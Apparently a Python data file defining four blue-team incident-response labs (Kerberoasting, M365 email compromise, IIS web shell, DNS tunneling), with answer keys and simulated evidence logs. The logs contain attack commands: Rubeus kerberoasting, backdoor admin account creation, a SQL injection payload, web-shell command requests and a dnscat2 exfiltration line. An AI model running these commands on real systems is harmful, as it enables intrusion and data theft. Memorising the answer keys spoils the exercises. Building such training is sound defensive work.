NET = lambda whois=None, dns=None: {"whois": whois or {}, "dns": dns or {}, "nmap": {}, "curl": {}}
H = "/home/analyst/evidence/"

KERB_LAB = {
    "id": "lab-kerberoast", "title": "Kerberoasting to Domain Admin", "difficulty": "Advanced", "duration": "75 min", "category": "Active Directory",
    "description": "A burst of RC4 Kerberos service tickets from an HR workstation was followed by a new Domain Admin. Prove the attack chain and scope the damage.",
    "scenario": "02:14 — the SIEM fired 'Excessive TGS requests (RC4)' from WS-HR-03. At 02:51 a new member was added to Domain Admins. The CISO wants to know before morning whether the domain is compromised. Logs and a PowerShell transcript are in ~/evidence.",
    "report_guide": "Cover: the requesting account and host, the roasted service account, how it was cracked, privilege escalation, persistence, and domain recovery actions.",
    "report_keywords": ["kerberoasting", "4769", "rc4", "s.chen", "ws-hr-03", "svc_sql", "domain admins", "support01", "krbtgt", "reset"],
    "tasks": [
        {"id": "k1", "phase": "Detection", "title": "Requesting account", "question": "Which user account requested the burst of TGS tickets?", "answer": "s.chen", "hint": "grep 4769 ~/evidence/dc_security.log"},
        {"id": "k2", "phase": "Detection", "type": "mcq", "title": "Why suspicious", "question": "What makes these 4769 events suspicious?", "options": ["Ticket encryption 0x17 (RC4) for many SPNs in seconds", "They come from the domain controller", "They use AES256 encryption", "They happen during business hours"], "answer": "Ticket encryption 0x17 (RC4) for many SPNs in seconds", "hint": "Look at Ticket_Encryption_Type"},
        {"id": "k3", "phase": "Investigation", "title": "Roasted account", "question": "Which service account's password did the attacker crack and then use?", "answer": "svc_sql", "hint": "cat ~/evidence/ps_transcript.txt"},
        {"id": "k4", "phase": "Investigation", "title": "Cracked password", "question": "Crack the svc_sql hash in hashes.txt. What is the password?", "answer": "Summer2024!", "hint": "john ~/evidence/hashes.txt"},
        {"id": "k5", "phase": "Scoping", "title": "Backdoor account", "question": "What account did the attacker create and add to Domain Admins?", "answer": "support01", "hint": "grep 4720 ~/evidence/dc_security.log"},
        {"id": "k6", "phase": "Response", "type": "mcq", "title": "Domain recovery", "question": "Domain Admin was obtained. Which recovery step is essential?", "options": ["Reset krbtgt twice, rotate svc_sql and all privileged passwords, remove support01", "Only delete support01", "Reboot the domain controller", "Disable Kerberos and use NTLM only"], "answer": "Reset krbtgt twice, rotate svc_sql and all privileged passwords, remove support01", "hint": "Golden ticket risk"},
    ],
    "kali": {"fs": {
        H + "README.txt": "Evidence: dc_security.log (DC-01), ps_transcript.txt (WS-HR-03), hashes.txt\n",
        H + "dc_security.log": "\n".join([f"2026-06-12T02:14:{10 + i:02d} DC-01 EventID=4769 Account=s.chen@ACME Client=10.0.4.33 (WS-HR-03) Service={s} Ticket_Encryption_Type=0x17" for i, s in enumerate(["svc_sql", "svc_backup", "svc_web", "svc_sharepoint", "svc_crm", "svc_print"])])
        + "\n2026-06-12T02:44:03 DC-01 EventID=4624 Account=svc_sql LogonType=3 Source=10.0.4.33\n2026-06-12T02:50:12 DC-01 EventID=4720 Subject=svc_sql NewAccount=support01\n2026-06-12T02:51:40 DC-01 EventID=4728 Subject=svc_sql Member=support01 Group=\"Domain Admins\"\n2026-06-12T02:58:00 DC-01 EventID=1102 Subject=support01 The audit log was cleared\n",
        H + "ps_transcript.txt": "PS C:\\Users\\s.chen> Import-Module .\\PowerView.ps1\nPS C:\\Users\\s.chen> Get-DomainUser -SPN | select samaccountname\nPS C:\\Users\\s.chen> .\\Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec\nPS C:\\Users\\s.chen> # cracked offline -> svc_sql\nPS C:\\Users\\s.chen> runas /netonly /user:ACME\\svc_sql powershell\nPS C:\\Users\\s.chen> net user support01 P@ssw0rd! /add /domain\nPS C:\\Users\\s.chen> net group \"Domain Admins\" support01 /add /domain\n",
        H + "hashes.txt": "svc_sql:$krb5tgs$23$*svc_sql$ACME.LOCAL$MSSQLSvc/sql01*$8f1c0e5d1b2a\nsvc_backup:$krb5tgs$23$*svc_backup$ACME.LOCAL$backup/bk01*$a19be7c33d0f\n"},
        "net": NET(), "pcap": "No capture loaded.", "cracked": {"$krb5tgs$23$*svc_sql$ACME.LOCAL$MSSQLSvc/sql01*$8f1c0e5d1b2a": "Summer2024!"}},
}

BEC_LAB = {
    "id": "lab-bec-m365", "title": "Business Email Compromise in Microsoft 365", "difficulty": "Intermediate", "duration": "45 min", "category": "Cloud / Email",
    "description": "A supplier says they never received a ₹18 lakh payment — the bank details were 'updated' by email. Trace the mailbox takeover end to end.",
    "scenario": "Accounts payable clerk m.shah paid a supplier invoice to a new bank account after an email from the supplier's 'new finance contact'. The supplier says the email never came from them. Sign-in logs, mailbox audit and the email thread are in ~/evidence.",
    "report_guide": "Cover: how the account was compromised, attacker IP and country, mailbox rule persistence, the fraudulent email, and containment (session revoke, rule removal, bank recall).",
    "report_keywords": ["m.shah", "password spray", "102.89.34.11", "nigeria", "inbox rule", "rss feeds", "revoke", "mfa", "bank", "recall"],
    "tasks": [
        {"id": "b1", "phase": "Initial Access", "title": "Attacker IP", "question": "Which IP signed in successfully to m.shah after many failures across users?", "answer": "102.89.34.11", "hint": "grep Success ~/evidence/signin.log"},
        {"id": "b2", "phase": "Initial Access", "type": "mcq", "title": "Technique", "question": "The same IP failed against 25 users with one password each. What is it?", "options": ["Password spray", "Brute force on one user", "Session hijacking", "SIM swap"], "answer": "Password spray", "hint": "Many users, one password"},
        {"id": "b3", "phase": "Persistence", "title": "Hidden folder", "question": "The attacker's inbox rule moved supplier emails into which folder?", "answer": "RSS Feeds", "hint": "cat ~/evidence/mailbox_audit.log"},
        {"id": "b4", "phase": "Fraud", "title": "Look-alike domain", "question": "Which look-alike domain sent the fake bank-change email?", "answer": "acme-suppIies.com", "hint": "cat ~/evidence/email_thread.txt (look closely at the l's)"},
        {"id": "b5", "phase": "Response", "type": "mcq", "title": "Containment", "question": "Which action set fully contains the BEC?", "options": ["Revoke sessions, reset password + MFA, delete the inbox rule, block the IP and ask the bank to recall the transfer", "Only change the password", "Delete the fraudulent email", "Disable mailbox auditing"], "answer": "Revoke sessions, reset password + MFA, delete the inbox rule, block the IP and ask the bank to recall the transfer", "hint": "Tokens survive password resets"},
    ],
    "kali": {"fs": {
        H + "README.txt": "Evidence: signin.log (Entra ID), mailbox_audit.log, email_thread.txt\n",
        H + "signin.log": "\n".join([f"2026-06-10T01:{10 + i:02d}:00Z user={u}@acme-corp.com ip=102.89.34.11 country=NG result=Failure(50126)" for i, u in enumerate(["a.kumar", "h.lee", "s.chen", "j.morris", "r.iyer", "p.das"] * 4)])
        + "\n2026-06-10T01:40:12Z user=m.shah@acme-corp.com ip=102.89.34.11 country=NG result=Success mfa=not_required(legacy auth)\n2026-06-10T09:02:44Z user=m.shah@acme-corp.com ip=49.36.12.8 country=IN result=Success mfa=satisfied\n",
        H + "mailbox_audit.log": "2026-06-10T01:43:10Z m.shah New-InboxRule Name='..' From='accounts@acme-suppliers.com' MoveToFolder='RSS Feeds' MarkAsRead=True ClientIP=102.89.34.11\n2026-06-10T01:47:55Z m.shah Send From=m.shah To=finance-team Subject='RE: Invoice 4471 bank update' ClientIP=102.89.34.11\n",
        H + "email_thread.txt": "From: Priya Nair <priya@acme-suppIies.com>\nTo: m.shah@acme-corp.com\nSubject: Invoice 4471 - updated bank details\n\nHi, our bank changed. Please use A/C 9182 7733 0012, IFSC HDFC0009912 for invoice 4471 (₹18,40,000). Urgent - month end.\n"},
        "net": NET({"acme-suppIies.com": "Domain Name: ACME-SUPPIIES.COM\nCreation Date: 2026-06-08T10:11:00Z\nRegistrar: PDR Ltd"}, {"acme-suppIies.com": "104.21.8.9"}), "pcap": "No capture loaded.", "cracked": {}},
}

WEBSHELL_LAB = {
    "id": "lab-webshell-iis", "title": "Web Shell on a Public IIS Server", "difficulty": "Intermediate", "duration": "50 min", "category": "Web Application",
    "description": "The WAF logged SQL injection, then w3wp.exe started spawning cmd.exe. Find the upload, the shell and what the attacker ran.",
    "scenario": "EDR on WEB-01 (customer portal) alerted: 'w3wp.exe spawned cmd.exe /c whoami'. The WAF was in detect-only mode. You have the IIS access log, a web-root listing and the EDR process events in ~/evidence.",
    "report_guide": "Cover: attacker IP and tool, the vulnerable page, the uploaded shell, commands executed, and remediation (remove shell, patch, rotate creds, WAF blocking).",
    "report_keywords": ["sqlmap", "sql injection", "193.32.162.77", "upload.aspx", "help.aspx", "w3wp", "whoami", "web shell", "patch", "rotate"],
    "tasks": [
        {"id": "w1", "phase": "Detection", "title": "Attacker IP", "question": "Which client IP sent the SQL injection payloads?", "answer": "193.32.162.77", "hint": "grep -i union ~/evidence/iis.log"},
        {"id": "w2", "phase": "Detection", "title": "Tool", "question": "Which automated tool does the user agent reveal?", "answer": "sqlmap", "hint": "Look at the last field of the iis.log lines"},
        {"id": "w3", "phase": "Investigation", "title": "Web shell", "question": "What is the file name of the uploaded web shell?", "answer": "help.aspx", "hint": "cat ~/evidence/webroot_listing.txt (newest file)"},
        {"id": "w4", "phase": "Investigation", "type": "mcq", "title": "Proof of execution", "question": "Which evidence proves the shell executed commands on the server?", "options": ["w3wp.exe spawning cmd.exe with whoami and net user", "HTTP 404 responses for /admin", "A 403 from the WAF", "DNS lookups for windowsupdate.com"], "answer": "w3wp.exe spawning cmd.exe with whoami and net user", "hint": "cat ~/evidence/edr_process.log"},
        {"id": "w5", "phase": "Response", "title": "Account created", "question": "Which local account did the attacker add through the shell?", "answer": "iis_svc2", "hint": "grep 'net user' ~/evidence/edr_process.log"},
    ],
    "kali": {"fs": {
        H + "README.txt": "Evidence: iis.log, webroot_listing.txt, edr_process.log (WEB-01)\n",
        H + "iis.log": "2026-06-11 13:02:11 GET /products.aspx id=7 200 193.32.162.77 sqlmap/1.8#stable\n2026-06-11 13:02:14 GET /products.aspx id=7'+UNION+SELECT+NULL,username,password+FROM+users-- 200 193.32.162.77 sqlmap/1.8#stable\n2026-06-11 13:05:40 GET /admin/login.aspx - 200 193.32.162.77 Mozilla/5.0\n2026-06-11 13:07:02 POST /admin/upload.aspx - 200 193.32.162.77 Mozilla/5.0\n2026-06-11 13:07:30 GET /uploads/help.aspx cmd=whoami 200 193.32.162.77 Mozilla/5.0\n2026-06-11 13:08:01 GET /uploads/help.aspx cmd=net+user+iis_svc2+Pa55!+/add 200 193.32.162.77 Mozilla/5.0\n2026-06-11 13:09:12 GET /uploads/help.aspx cmd=net+localgroup+administrators+iis_svc2+/add 200 193.32.162.77 Mozilla/5.0\n",
        H + "webroot_listing.txt": "2026-03-02 10:00  14,212  C:\\inetpub\\portal\\products.aspx\n2026-03-02 10:00   9,880  C:\\inetpub\\portal\\admin\\upload.aspx\n2026-06-11 13:07   1,204  C:\\inetpub\\portal\\uploads\\help.aspx\n",
        H + "edr_process.log": "13:07:30 WEB-01 w3wp.exe(4410) -> cmd.exe /c whoami  => iis apppool\\portal\n13:08:01 WEB-01 w3wp.exe(4410) -> cmd.exe /c net user iis_svc2 Pa55! /add\n13:09:12 WEB-01 w3wp.exe(4410) -> cmd.exe /c net localgroup administrators iis_svc2 /add\n"},
        "net": NET({"193.32.162.77": "NetRange: 193.32.162.0/24\nOrgName: VPS Hosting Provider\nCountry: RO"}), "pcap": "No capture loaded.", "cracked": {}},
}

DNS_LAB = {
    "id": "lab-dns-tunnel", "title": "DNS Tunneling Data Exfiltration", "difficulty": "Advanced", "duration": "60 min", "category": "Exfiltration",
    "description": "An IT server is sending thousands of long TXT queries to one odd domain. Decode the tunnel and figure out what left the building.",
    "scenario": "The DNS team noticed IT-SRV-02 is the top DNS talker this week, all to one domain with very long subdomains. Nobody can explain it. DNS logs, a pcap summary and process events are in ~/evidence.",
    "report_guide": "Cover: the host and process, tunnel domain, encoding, what data was exfiltrated, and response (sinkhole, isolate, block direct DNS).",
    "report_keywords": ["dns tunneling", "it-srv-02", "exfil-tunnel.xyz", "txt", "base64", "dnscat", "passwords.kdbx", "sinkhole", "isolate", "block"],
    "tasks": [
        {"id": "d1", "phase": "Detection", "title": "Tunnel domain", "question": "Which base domain receives the long subdomain queries?", "answer": "exfil-tunnel.xyz", "hint": "head ~/evidence/dns.log"},
        {"id": "d2", "phase": "Detection", "type": "mcq", "title": "Record type", "question": "Which DNS record type carries the data channel?", "options": ["TXT", "A", "MX", "PTR"], "answer": "TXT", "hint": "Check the qtype column"},
        {"id": "d3", "phase": "Investigation", "title": "Decode", "question": "Decode the first labelled chunk (base64). What file name is being exfiltrated?", "answer": "passwords.kdbx", "hint": "echo <chunk> | base64 -d"},
        {"id": "d4", "phase": "Investigation", "title": "Process", "question": "Which executable generated the DNS traffic?", "answer": "dnscat2.exe", "hint": "cat ~/evidence/process.log"},
        {"id": "d5", "phase": "Response", "type": "mcq", "title": "Response", "question": "What is the best immediate response?", "options": ["Sinkhole the domain, isolate IT-SRV-02 and rotate the vault's secrets", "Add the domain to the allow-list", "Restart the DNS server", "Only delete dnscat2.exe"], "answer": "Sinkhole the domain, isolate IT-SRV-02 and rotate the vault's secrets", "hint": "The password vault left the network"},
    ],
    "kali": {"fs": {
        H + "README.txt": "Evidence: dns.log, pcap_summary.txt, process.log (IT-SRV-02)\n",
        H + "dns.log": "ts client qtype query\n2026-06-09T22:00:01 10.0.0.12 TXT cGFzc3dvcmRzLmtkYng=.0001.exfil-tunnel.xyz\n2026-06-09T22:00:02 10.0.0.12 TXT a2RieC1jaHVuay0wMDAyLWFhYWFhYWFhYWFhYWFhYWFh.0002.exfil-tunnel.xyz\n2026-06-09T22:00:03 10.0.0.12 TXT a2RieC1jaHVuay0wMDAzLWJiYmJiYmJiYmJiYmJiYmJi.0003.exfil-tunnel.xyz\n2026-06-09T22:00:04 10.0.0.12 A windowsupdate.com\n2026-06-09T22:00:05 10.0.0.12 TXT a2RieC1jaHVuay0wMDA0LWNjY2NjY2NjY2NjY2NjY2Nj.0004.exfil-tunnel.xyz\n... 4,812 more TXT queries to exfil-tunnel.xyz ...\n",
        H + "pcap_summary.txt": "Top talkers (DNS): 10.0.0.12 (IT-SRV-02) 4,816 queries, avg qname length 61\nTop domain: exfil-tunnel.xyz (99.2% TXT)\nResolver bypass: 10.0.0.12 -> 45.95.169.22:53 direct (not via 10.0.0.5)\n",
        H + "process.log": "22:00:00 IT-SRV-02 svc_patch C:\\ProgramData\\dnscat2.exe --dns server=45.95.169.22,domain=exfil-tunnel.xyz --secret=x\n21:58:41 IT-SRV-02 svc_patch copy \\\\FS-01\\it\\vault\\passwords.kdbx C:\\ProgramData\\\n"},
        "net": NET({"exfil-tunnel.xyz": "Domain Name: EXFIL-TUNNEL.XYZ\nCreation Date: 2026-06-07T03:00:00Z\nRegistrar: Hosting Concepts B.V."}, {"exfil-tunnel.xyz": "45.95.169.22"}), "pcap": "1 0.00 10.0.0.12 -> 45.95.169.22 DNS TXT cGFzc3dvcmRzLmtkYng=.0001.exfil-tunnel.xyz\n2 0.98 10.0.0.12 -> 45.95.169.22 DNS TXT a2RieC1jaHVuay0wMDAy....0002.exfil-tunnel.xyz", "cracked": {}},
}

NEW_LABS = [KERB_LAB, BEC_LAB, WEBSHELL_LAB, DNS_LAB]
